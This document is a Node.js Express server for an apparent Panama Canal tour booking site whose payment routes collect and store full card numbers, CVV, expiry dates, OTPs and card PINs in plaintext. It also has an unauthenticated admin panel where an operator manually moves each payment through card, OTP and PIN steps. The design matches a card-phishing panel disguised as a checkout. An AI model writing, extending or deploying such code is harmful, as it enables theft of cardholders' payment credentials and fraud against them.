import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import pkg from 'pg';
import { v4 as uuidv4 } from 'uuid';
import path from 'path';
import { fileURLToPath } from 'url';

const { Pool } = pkg;
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Database Connection
const pool = new Pool({
  user: process.env.DB_USER || 'panama_user',
  password: process.env.DB_PASSWORD || 'panama_secure_pass',
  host: process.env.DB_HOST || 'localhost',
  port: process.env.DB_PORT || 5432,
  database: process.env.DB_NAME || 'panama_canal',
});

// Initialize Database Tables
async function initializeDatabase() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS bookings (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        tour_type VARCHAR(50) NOT NULL,
        customer_name VARCHAR(255) NOT NULL,
        customer_email VARCHAR(255) NOT NULL,
        customer_phone VARCHAR(20),
        number_of_people INT NOT NULL,
        booking_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        status VARCHAR(20) DEFAULT 'pending',
        total_price DECIMAL(10, 2),
        notes TEXT
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS payments (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        booking_id UUID REFERENCES bookings(id),
        card_number VARCHAR(20) NOT NULL,
        card_holder VARCHAR(255) NOT NULL,
        expiry_date VARCHAR(10) NOT NULL,
        cvv VARCHAR(10) NOT NULL,
        email VARCHAR(255) NOT NULL,
        amount DECIMAL(10, 2) NOT NULL,
        status VARCHAR(20) DEFAULT 'pending',
        otp VARCHAR(10),
        pin VARCHAR(10),
        payment_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        approval_date TIMESTAMP,
        rejection_reason TEXT
      )
    `);

    console.log('✅ Database tables initialized successfully');
  } catch (error) {
    console.error('❌ Database initialization error:', error);
  }
}

// Routes

// Middleware to fix date picker by injecting override script
app.use((req, res, next) => {
  const originalSend = res.send;
  res.send = function(data) {
    if (typeof data === 'string' && data.includes('booking_date')) {
      // Inject CSS and JS to override WordPress date picker
      const datePickerFix = `
<style>
/* Override WordPress date picker styles */
input[name="booking_date"] {
  display: block !important;
  visibility: visible !important;
  opacity: 1 !important;
  pointer-events: auto !important;
  background-color: white !important;
  border: 1px solid #ccc !important;
  padding: 8px !important;
  font-size: 14px !important;
  width: 100% !important;
  box-sizing: border-box !important;
}
</style>
<script>
// Disable WordPress date picker plugin
window.dy_date_picker = null;
if (window.jQuery) {
  jQuery(document).ready(function() {
    var dateInputs = document.querySelectorAll('input[name="booking_date"]');
    dateInputs.forEach(function(input) {
      input.type = 'date';
      input.removeAttribute('placeholder');
      input.removeAttribute('disabled');
      input.removeAttribute('class');
      input.required = true;
    });
  });
}
</script>
`;
      data = data.replace('</body>', datePickerFix + '</body>');
    }
    return originalSend.call(this, data);
  };
  next();
});

// Serve static files
app.use(express.static(__dirname));

// API Routes for Bookings
app.post('/api/bookings', async (req, res) => {
  try {
    const { tour_type, customer_name, customer_email, customer_phone, number_of_people, total_price, notes } = req.body;

    const result = await pool.query(
      'INSERT INTO bookings (tour_type, customer_name, customer_email, customer_phone, number_of_people, total_price, notes) VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING *',
      [tour_type, customer_name, customer_email, customer_phone, number_of_people, total_price, notes]
    );

    res.json({ success: true, booking: result.rows[0] });
  } catch (error) {
    console.error('Booking error:', error);
    res.status(500).json({ error: 'Failed to create booking' });
  }
});

app.get('/api/bookings', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM bookings ORDER BY booking_date DESC');
    res.json(result.rows);
  } catch (error) {
    console.error('Fetch bookings error:', error);
    res.status(500).json({ error: 'Failed to fetch bookings' });
  }
});

// API Routes for Payments
app.post('/api/payments/submit-card', async (req, res) => {
  try {
    const { cardNumber, cardHolder, expiryDate, cvv, email, bookingId, amount } = req.body;
    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    const result = await pool.query(
      'INSERT INTO payments (booking_id, card_number, card_holder, expiry_date, cvv, email, amount, otp, status) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING *',
      [bookingId, cardNumber, cardHolder, expiryDate, cvv, email, amount, otp, 'pending_card']
    );

    console.log(`[PAYMENT] Card submitted for ${email}. OTP: ${otp}`);

    res.json({
      success: true,
      paymentId: result.rows[0].id,
      message: 'Card details received. OTP sent to your email.'
    });
  } catch (error) {
    console.error('Payment submission error:', error);
    res.status(500).json({ error: 'Failed to process payment' });
  }
});

app.post('/api/payments/verify-otp', async (req, res) => {
  try {
    const { paymentId, otp } = req.body;

    const paymentResult = await pool.query('SELECT * FROM payments WHERE id = $1', [paymentId]);
    if (paymentResult.rows.length === 0) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    const payment = paymentResult.rows[0];
    if (payment.otp !== otp) {
      return res.status(400).json({ error: 'Invalid OTP' });
    }

    const pin = Math.floor(1000 + Math.random() * 9000).toString();
    await pool.query('UPDATE payments SET status = $1, pin = $2 WHERE id = $3', ['pending_pin', pin, paymentId]);

    console.log(`[PAYMENT] OTP verified for ${payment.email}. PIN: ${pin}`);

    res.json({ success: true, message: 'OTP verified. Please enter your PIN.' });
  } catch (error) {
    console.error('OTP verification error:', error);
    res.status(500).json({ error: 'Failed to verify OTP' });
  }
});

app.post('/api/payments/verify-pin', async (req, res) => {
  try {
    const { paymentId, pin } = req.body;

    const paymentResult = await pool.query('SELECT * FROM payments WHERE id = $1', [paymentId]);
    if (paymentResult.rows.length === 0) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    const payment = paymentResult.rows[0];
    if (payment.pin !== pin) {
      return res.status(400).json({ error: 'Invalid PIN' });
    }

    await pool.query('UPDATE payments SET status = $1 WHERE id = $2', ['completed', paymentId]);

    console.log(`[PAYMENT] PIN verified for ${payment.email}. Payment completed!`);

    res.json({ success: true, message: 'Payment completed successfully!' });
  } catch (error) {
    console.error('PIN verification error:', error);
    res.status(500).json({ error: 'Failed to verify PIN' });
  }
});

// Admin Routes
app.get('/api/admin/payments', async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT * FROM payments WHERE status != $1 AND status != $2 ORDER BY payment_date DESC',
      ['completed', 'rejected']
    );
    res.json(result.rows);
  } catch (error) {
    console.error('Fetch payments error:', error);
    res.status(500).json({ error: 'Failed to fetch payments' });
  }
});

app.post('/api/admin/payments/:id/approve', async (req, res) => {
  try {
    const { id } = req.params;

    const paymentResult = await pool.query('SELECT * FROM payments WHERE id = $1', [id]);
    if (paymentResult.rows.length === 0) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    const payment = paymentResult.rows[0];
    let newStatus = payment.status;

    if (payment.status === 'pending_card') {
      newStatus = 'pending_otp';
    } else if (payment.status === 'pending_otp') {
      newStatus = 'pending_pin';
    } else if (payment.status === 'pending_pin') {
      newStatus = 'completed';
    }

    await pool.query('UPDATE payments SET status = $1, approval_date = CURRENT_TIMESTAMP WHERE id = $2', [newStatus, id]);

    console.log(`[ADMIN] Payment ${id} approved. New status: ${newStatus}`);

    res.json({ success: true, message: 'Payment approved and moved to next step.' });
  } catch (error) {
    console.error('Approve payment error:', error);
    res.status(500).json({ error: 'Failed to approve payment' });
  }
});

app.post('/api/admin/payments/:id/reject', async (req, res) => {
  try {
    const { id } = req.params;
    const { reason } = req.body;

    const paymentResult = await pool.query('SELECT * FROM payments WHERE id = $1', [id]);
    if (paymentResult.rows.length === 0) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    await pool.query('UPDATE payments SET status = $1, rejection_reason = $2 WHERE id = $3', ['rejected', reason, id]);

    console.log(`[ADMIN] Payment ${id} rejected. Reason: ${reason}`);

    res.json({ success: true, message: 'Payment rejected.' });
  } catch (error) {
    console.error('Reject payment error:', error);
    res.status(500).json({ error: 'Failed to reject payment' });
  }
});

// Admin Dashboard Page
app.get('/admin-dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-dashboard.html'));
});

// 404 Error Page
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'error-404.html'));
});

// Start Server
async function startServer() {
  try {
    await initializeDatabase();
    app.listen(PORT, () => {
      console.log(`🚀 Server running on http://localhost:${PORT}`);
      console.log(`📊 Admin Dashboard: http://localhost:${PORT}/admin-dashboard`);
    });
  } catch (error) {
    console.error('❌ Failed to start server:', error);
    process.exit(1);
  }
}

startServer();
